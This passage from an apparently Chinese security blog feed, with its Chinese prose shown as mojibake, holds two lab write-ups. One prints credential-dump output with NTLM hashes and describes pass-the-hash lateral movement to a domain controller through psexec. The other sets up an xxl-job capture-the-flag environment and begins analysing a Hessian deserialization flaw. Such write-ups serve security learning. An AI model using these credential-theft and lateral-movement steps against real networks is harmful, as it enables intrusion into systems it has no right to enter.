f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>kerberos :<br> * Username : win7$<br> * Domain   : SUN.COM<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 46807 (00000000:0000b6d7)<br>Session           : UndefinedLogonType from 0<br>User Name         : (null)<br>Domain            : (null)<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : <br>msv :<br> [00000003] Primary<br> * Username : WIN7$<br> * Domain   : SUN<br> * NTLM     : 19a799ef7003f143f69e5eb204369f74<br> * SHA1     : e7a55023d5275327b14b77af9fb37f9929ce114d<br>tspkg :<br>wdigest :<br>kerberos :<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 999 (00000000:000003e7)<br>Session           : UndefinedLogonType from 0<br>User Name         : WIN7$<br>Domain            : SUN<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : S-1-5-18<br>msv :<br>tspkg :<br>wdigest :<br> * Username : WIN7$<br> * Domain   : SUN<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>kerberos :<br> * Username : win7$<br> * Domain   : SUN.COM<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>ssp :<br>credman :<br></code></pre></td></tr></table></figure><p>ç®¡ç†å‘˜å¯†ç ç›¸å…³çš„ä¿¡æ¯æˆ‘ä»¬ä¹Ÿå·²ç»æ‰¾åˆ°äº†</p><p>ç”¨æˆ·å“ˆå¸Œä¹Ÿæ‹¿ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>heart:1000:aad3b435b51404eeaad3b435b51404ee:a34efdd63a23abea4413ba73cafa5a30:::<br></code></pre></td></tr></table></figure><h2 id="æ‰“åŸŸæ§"><a href="#æ‰“åŸŸæ§" class="headerlink" title="æ‰“åŸŸæ§"></a>æ‰“åŸŸæ§</h2><p>æ¥ä¸‹æ¥å°±æ˜¯è¦æ‹¿ä¸‹åŸŸæ§äº†</p><p>æ—¢ç„¶éƒ½æ‹¿åˆ°hashäº†é‚£å°±ç›´æ¥psexecæ¨ªå‘ç§»åŠ¨ä¸€æŠŠæ¢­äº†</p><p>å»ºç«‹ä¸€ä¸ªsmbç›‘å¬å™¨</p><p><img src="https://cdn.clown2024.cn/image-20241121171441969.png" alt="image-20241121171441969"></p><p>ç„¶åç›´æ¥jump psexec</p><p><img src="https://cdn.clown2024.cn/image-20241121171456605.png" alt="image-20241121171456605"></p><p>æˆåŠŸä¸Šçº¿</p><p><img src="https://cdn.clown2024.cn/image-20241121171531530.png" alt="image-20241121171531530"></p><p><img src="https://cdn.clown2024.cn/image-20241121171543198.png" alt="image-20241121171543198"></p><p>psexecèƒ½ä¸€æŠŠæ¢­ä¸»è¦è¿˜æ˜¯DCä¸»æœºå¼€äº†$ADMINå…±äº«ç®¡é“</p><p><img src="https://cdn.clown2024.cn/image-20241121172048305.png" alt="image-20241121172048305"></p><p>è¿™å°é¶æœºæ¯”å‰é¢çš„ç®€å•æŒºå¤šçš„</p><p>å…¶å®åº”è¯¥win7é¶æœºç”¨æ™®é€šç”¨æˆ·ç™»å½•æ‰å¯¹ï¼Œè¿™æ ·æˆ‘ä»¬æ‰éœ€è¦ææƒ</p><p>æŸ¥æ‰¾ææƒæ¼æ´çš„è¯æˆ‘ä»¬å¯ä»¥ç”¨systeminfoä¿å­˜ä¸‹ç³»ç»Ÿä¿¡æ¯ï¼Œç„¶åç”¨wesngå·¥å…·æ¥æœç´¢</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python wes.py sysinfo.txt --impact <span class="hljs-string">&quot;Elevation of Privilege&quot;</span><br><span class="hljs-comment">#--impactæŒ‡å®šæ¼æ´ç±»å‹ä¸ºææƒæ¼æ´</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241121183215773.png" alt="image-20241121183215773"></p><p>ç„¶åå°±å¯ä»¥æ‰¾åˆ°å„ç§æ¼æ´ä¿¡æ¯äº†</p><p>expæ¼æ´åº“ï¼š<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;è™šæ‹Ÿæœºå¯†ç &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;win7&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;sun</summary>
      
    
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>DASCtf-easyjob</title>
    <link href="https://clowsman.github.io/2024/11/18/DASCtf-easyjob/"/>
    <id>https://clowsman.github.io/2024/11/18/DASCtf-easyjob/</id>
    <published>2024-11-18T11:57:35.000Z</published>
    <updated>2024-11-28T10:34:00.056Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ç”±äºé¢˜ç›®æ˜¯å…¬å…±é¶æœºç°åœ¨å·²ç»æŒ‚äº†ï¼Œæ‰€ä»¥å¤ç°éœ€è¦è‡ªå·±æ­å»ºé¢˜ç›®ç¯å¢ƒ</p><p>è·Ÿç€è¿™ç¯‡æ–‡ç« æ¥é…ç½®ä¸€ä¸‹ï¼š<a href="https://www.cnblogs.com/vickey-wu/p/9087951.html">https://www.cnblogs.com/vickey-wu/p/9087951.html</a></p><p>ä¸»è¦æ˜¯adminç»„ä»¶çš„é…ç½®ï¼Œå› ä¸ºä»–æ˜¯ä¸€ä¸ªwarï¼Œéœ€è¦éƒ¨ç½²åœ¨tomcatä¸Šï¼Œexecutoræ˜¯springbootåº”ç”¨ï¼Œç›´æ¥java -jarå°±è¡Œäº†</p><p><strong>mysqlé…ç½®</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å¯åŠ¨æ•°æ®åº“</span><br>docker run -itd --name xxl-mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:5.6.40<br><span class="hljs-comment"># å¤åˆ¶sqlåˆ°å®¹å™¨ä¸­</span><br>docker <span class="hljs-built_in">cp</span> &lt;xxl-jobçš„sqlæ–‡ä»¶&gt; xxl-mysql:/tmp<br><span class="hljs-comment"># è¿›å…¥å®¹å™¨è¿æ¥æ•°æ®åº“</span><br>mysql -uroot -p123456<br><span class="hljs-comment"># æ‰§è¡Œå‘½ä»¤å¯¼å…¥æ•°æ®åº“</span><br><span class="hljs-built_in">source</span> /tmp/tables_xxl_job.sql<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241119102349324.png" alt="image-20241119102349324"></p><p>ç„¶åæœ¬åœ°ç¼–è¯‘ä¸€ä¸‹xxl-jobçš„adminé¡¹ç›®ï¼Œæˆ‘ä»¬éœ€è¦ä»–waråŒ…è§£å‹åçš„æ–‡ä»¶å¤¹ï¼Œé…ç½®æ–‡ä»¶éœ€è¦ä¿®æ”¹ä¸€ä¸‹ï¼Œxxl.job.db.passwordå±æ€§æ”¹æˆåˆšåˆšçš„æ•°æ®åº“çš„å¯†ç </p><p>ç„¶åå†™ä¸€ä¸ªdockerfileæ„å»ºtomcatæœåŠ¡</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/tomcat:<span class="hljs-number">8.5</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br><br><span class="hljs-keyword">ENV</span> TOMCAT_WEBAPPS /usr/local/tomcat/webapps<br><span class="hljs-keyword">ENV</span> TIME_ZONE Asia/Shanghai<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/* <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/docs <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/examples <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/host-manager <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/manager \</span><br><span class="language-bash">&amp;&amp; <span class="hljs-built_in">ln</span> -snf /usr/share/zoneinfo/<span class="hljs-variable">$TIME_ZONE</span> /etc/localtime &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TIME_ZONE</span> &gt; /etc/timezone</span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-admin-1.9.2 <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/</span><br></code></pre></td></tr></table></figure><p>æ„å»ºé•œåƒ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker build -t xxl-admin:0.1 .<br></code></pre></td></tr></table></figure><p>å¯åŠ¨é•œåƒ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker run -itd --name xxl-admin -p 8080:8080 xxl-admin:0.1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241119105306668.png" alt="image-20241119105306668"></p><p>ç„¶åæœ¬åœ°ç¼–è¯‘xxl-job-executor-sample-springbootæ‰§è¡Œå™¨ï¼Œè¿™ä¸ªå’Œé¢˜ç›®çš„æ˜¯ä¸€æ ·çš„ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶çš„xxl.job.admin.addressesä¸º<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080/</a></p><p>ç„¶åç›´æ¥java -jarå°±èƒ½è·‘èµ·æ¥äº†</p><p><img src="https://cdn.clown2024.cn/image-20241119105551883.png" alt="image-20241119105551883"></p><p>æˆ‘ä»¬çš„æ‰§è¡Œå™¨ä¹Ÿä¸Šçº¿äº†</p><p><img src="https://cdn.clown2024.cn/image-20241119105718265.png" alt="image-20241119105718265"></p><h2 id="docker-composeæ­å»º"><a href="#docker-composeæ­å»º" class="headerlink" title="docker-composeæ­å»º"></a>docker-composeæ­å»º</h2><p>æƒ³è‡ªå·±è¯•è¯•docker-composeæ­å»ºï¼Œæ²¡æœ‰æ€ä¹ˆæ­å»ºè¿‡å¤šå®¹å™¨çš„åº”ç”¨ï¼Œä½†æ˜¯æµªè´¹äº†å¥½å¤šæ—¶é—´å•Šå®åœ¨æ˜¯ï¼Œå¤ªæŠ˜ç£¨äº†</p><p>å…ˆç»™ä¸€ä¸ªæ€»çš„docker-compose.yaml</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">admin:</span><br>    <span class="hljs-attr">build:</span><br>      <span class="hljs-attr">context:</span> <span class="hljs-string">./admin</span><br>      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">dockerfile</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">admin</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8080:8080&quot;</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">xxl-job-network</span><br>  <span class="hljs-attr">executor:</span><br>    <span class="hljs-attr">build:</span><br>      <span class="hljs-attr">context:</span> <span class="hljs-string">./executor</span><br>      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">dockerfile</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">admin</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">executor</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9999:9999&quot;</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">xxl-job-network</span><br>  <span class="hljs-attr">db:</span><br>    <span class="hljs-attr">build:</span><br>      <span class="hljs-attr">context:</span> <span class="hljs-string">.</span><br>      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">dockerfile</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">mysql</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3306:3306&quot;</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">xxl-job-network</span><br>    <span class="hljs-attr">command:</span> <span class="hljs-string">--default-authentication-plugin=mysql_native_password</span> <span class="hljs-comment">#è§£å†³å¤–éƒ¨æ— æ³•è®¿é—®</span><br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">xxl-job-network:</span><br></code></pre></td></tr></table></figure><p><strong>å¯åŠ¨mysqlçš„dockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/mysql:<span class="hljs-number">5.7</span><br><span class="hljs-comment"># è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œè®¾ç½® MySQL çš„ root å¯†ç </span><br><span class="hljs-keyword">ENV</span> MYSQL_ROOT_PASSWORD=<span class="hljs-number">123456</span><br><br><span class="hljs-comment"># å°† XXL-Job çš„ SQL è„šæœ¬å¤åˆ¶åˆ°å®¹å™¨ä¸­çš„ /tmp ç›®å½•</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./tables_xxl_job.sql /tmp/</span><br><span class="hljs-comment"># å¤åˆ¶åˆ°docker-entrypoint-initdb.dä¸­</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mv</span> /tmp/*.sql /docker-entrypoint-initdb.d</span><br><br><span class="hljs-comment"># å°† XXL-Job çš„ SQL è„šæœ¬å¤åˆ¶åˆ°å®¹å™¨ä¸­çš„ /docker-entrypoint-initdb.d ç›®å½•ï¼ŒMySQL å®˜æ–¹é•œåƒçš„ä¸€ä¸ªç‰¹æ€§ï¼šä»»ä½•æ”¾åœ¨ /docker-entrypoint-initdb.d/ ç›®å½•ä¸‹çš„ .sql æ–‡ä»¶éƒ½ä¼šåœ¨ MySQL æœåŠ¡å¯åŠ¨æ—¶è‡ªåŠ¨æ‰§è¡Œã€‚</span><br><br><span class="hljs-keyword">ENV</span> LANG=C.UTF-<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘æƒ³ç€å‚è€ƒvulhubé‡Œçš„2.2ç‰ˆæœ¬çš„xxl-jobç¯å¢ƒæ¥è¿›è¡Œæ­å»ºï¼Œä½†æ˜¯åœ¨mavenç¼–è¯‘çš„æ—¶å€™æ€»ä¼šå‡ºé”™ï¼Œæˆ‘åªèƒ½é‡‡å–æœ¬åœ°å…ˆç¼–è¯‘ç„¶åå†å°†jaråŒ…ä¹‹ç±»çš„ç›´æ¥æ”¾å…¥</p><p><strong>adminçš„dockerfile</strong></p><p>ç¼–è¯‘å¥½ä¹‹åå°†è§£å‹çš„waråŒ…ç›®å½•æ”¾åœ¨dockerfileçš„ä¸Šä¸‹æ–‡ç›®å½•ä¸­</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/tomcat:<span class="hljs-number">8.5</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br><br><span class="hljs-keyword">ENV</span> TOMCAT_WEBAPPS /usr/local/tomcat/webapps<br><span class="hljs-keyword">ENV</span> TIME_ZONE Asia/Shanghai<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/* <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/docs <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/examples <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/host-manager <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/manager \</span><br><span class="language-bash">&amp;&amp; <span class="hljs-built_in">ln</span> -snf /usr/share/zoneinfo/<span class="hljs-variable">$TIME_ZONE</span> /etc/localtime &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TIME_ZONE</span> &gt; /etc/timezone</span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-admin-1.9.2 <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf /tmp/*</span><br></code></pre></td></tr></table></figure><p>ç¼–è¯‘å‰éœ€è¦æ”¹ä¸€ä¸‹é…ç½®ï¼Œæˆ‘ä»¬è¿æ¥æ•°æ®åº“é‡‡ç”¨æœåŠ¡åçš„æ–¹å¼åœ¨docker-composeä¸­ï¼Œxxl.job.db.urlæ”¹æˆå¦‚ä¸‹ï¼š</p><figure class="highlight properties"><table><tr><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">xxl.job.db.url</span>=<span class="hljs-string">jdbc:mysql://db:3306/xxl-job?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=false</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œè¦æ³¨æ„ä¸€ä¸ªå‘ï¼Œåœ¨mysql5.7ä»¥ä¸Šè¿æ¥æ•°æ®åº“æ˜¯éœ€è¦é…ç½®useSSL&#x3D;falseæˆ–è€…trueè¿™ä¸ªé€‰é¡¹çš„ï¼Œä¸ç„¶è¿æ¥çš„æ—¶å€™ä¼šä¸€ç›´bad handshakeï¼Œè¢«å‘äº†å¥½ä¹…åœ¨è¿™é‡ŒğŸ˜­</p></blockquote><p><strong>æœ€åæ˜¯executorçš„dockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/openjdk:<span class="hljs-number">8</span>u272-jre<br><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> maintainer=<span class="hljs-string">&quot;clown&quot;</span></span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-executor-sample-springboot-1.9.2.jar /usr/src/xxl-job-executor-sample-springboot-1.9.2.jar</span><br><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /usr/src</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;-jar&quot;</span>, <span class="hljs-string">&quot;/usr/src/xxl-job-executor-sample-springboot-1.9.2.jar&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿæ˜¯å…ˆç¼–è¯‘å¥½ç„¶åæ”¾åˆ°dockerfileçš„ä¸Šä¸‹æ–‡ä¸­</p><p>åŒæ ·éœ€è¦ä¿®æ”¹ä¸€ä¸‹é…ç½®ï¼Œå°†xxl.job.admin.addressesæ”¹æˆå¦‚ä¸‹ï¼š</p><figure class="highlight properties"><table><tr><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">xxl.job.admin.addresses</span>=<span class="hljs-string">http://admin:8080/</span><br></code></pre></td></tr></table></figure><p>æˆ‘çš„æ–‡ä»¶ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241119152118108.png" alt="image-20241119152118108"></p><p>é‡Œé¢æ··æ‚ç€ä¸€äº›æ²¡ç”¨çš„æ–‡ä»¶é—®é¢˜ä¸å¤§ï¼Œéƒ½æ˜¯å¤±è´¥çš„è¯•éªŒå“ğŸ˜­</p><p>æœ€å</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker compose up -d<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241119152217714.png" alt="image-20241119152217714"></p><p><img src="https://cdn.clown2024.cn/image-20241119152237897.png" alt="image-20241119152237897"></p><p>æˆåŠŸå¯åŠ¨ï¼</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.cnblogs.com/PeterJXL/p/18415349">https://www.cnblogs.com/PeterJXL/p/18415349</a></p><p><a href="https://www.cnblogs.com/vickey-wu/p/9087951.html">https://www.cnblogs.com/vickey-wu/p/9087951.html</a></p><p><a href="https://blog.csdn.net/lichaohao_10/article/details/127445796">https://blog.csdn.net/lichaohao_10/article/details/127445796</a></p><h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><p>å› ä¸ºè¿™é¢˜æ¶‰åŠåˆ°äº†HessianåŸç”Ÿååºåˆ—åŒ–ï¼Œåˆšå¥½è¿˜æœ‰ä¸€ç§æ–¹å¼æ²¡çœ‹ï¼Œè¿™é‡Œå°±é¡ºä¾¿ç®€å•å­¦ä¹ ä¸€ä¸‹</p><h2 id="hessiançš„tostingå¼‚å¸¸ååºåˆ—åŒ–"><a href="#Hessiançš„toStingå¼‚å¸¸ååºåˆ—åŒ–" class="headerlink" title="Hessiançš„toStingå¼‚å¸¸ååºåˆ—åŒ–"></a>Hessiançš„toStingå¼‚å¸¸ååºåˆ—åŒ–</h2><p>åŸç†æ˜¯å­—ç¬¦ä¸²å’Œå¯¹è±¡æ‹¼æ¥å¯¼è‡´éšå¼è§¦å‘äº†è¯¥å¯¹è±¡çš„toStringæ–¹æ³•ï¼Œè¯¥æ¼æ´æœ‰ä¸€ä¸ªcveï¼ŒCVE-2021-43297</p><p>è¿™ä¸ªCVEé’ˆå¯¹çš„æ˜¯Hessian2Input#expectï¼ŒHessian1åˆ™æ²¡æœ‰å¯¹åº”çš„é—®é¢˜ã€‚</p><h3 id="åˆ©ç”¨å…³é”®"><a href="#åˆ©ç”¨å…³é”®" class="headerlink" title="åˆ©ç”¨å…³é”®"></a>åˆ©ç”¨å…³é”®</h3><p>æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹expectçš„å†™æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> IOException <span class="hljs-title function_">expect</span><span class="hljs-params">(String expect, <span class="hljs-type">int</span> ch)</span><br>    <span class="hljs-keyword">throws</span> IOException<br>  &#123;<br>    <span class="hljs-keyword">if</span> (ch &lt; <span class="hljs-number">0</span>)<br>      <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect + <span class="hljs-string">&quot; at end of file&quot;</span>);<br>    <span class="hljs-keyword">else</span> &#123;<br>      _offset--;<br><br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> _offset;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">context</span><br>          <span class="hljs-operator">=</span> buildDebugContext(_buffer, <span class="hljs-number">0</span>, _length, offset);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> readObject();<br><br>        <span class="hljs-keyword">if</span> (obj != <span class="hljs-literal">null</span>) &#123;<br>          <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect<br>                       + <span class="hljs-string">&quot; at 0x&quot;</span> + Integer.toHexString(ch &amp; <span class="hljs-number">0xff</span>)<br>                       + <span class="hljs-string">&quot; &quot;</span> + obj.getClass().getName() + <span class="hljs-string">&quot; (&quot;</span> + obj + <span class="hljs-string">&quot;)&quot;</span><br>                       + <span class="hljs-string">&quot;\n  &quot;</span> + context + <span class="hljs-string">&quot;&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>          <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect<br>                       + <span class="hljs-string">&quot; at 0x&quot;</span> + Integer.toHexString(ch &amp; <span class="hljs-number">0xff</span>) + <span class="hljs-string">&quot; null&quot;</span>);<br>      &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        log.log(Level.FINE, e.toString(), e);<br><br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect<br>                     + <span class="hljs-string">&quot; at 0x&quot;</span> + Integer.toHexString(ch &amp; <span class="hljs-number">0xff</span>));<br>      &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ¥å—äº†ä¸€ä¸ªexpectçš„Stringç±»å‹å˜é‡ï¼Œç„¶åè°ƒç”¨readObjectæ–¹æ³•è·å–äº†ä¸€ä¸ªå¯¹è±¡ï¼Œå†ç›´æ¥å°†expectå’Œobjå¯¹è±¡æ‹¼æ¥èµ·æ¥ï¼Œä»è€Œè§¦å‘äº†è¯¥å¯¹è±¡çš„toStringæ–¹æ³•</p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" 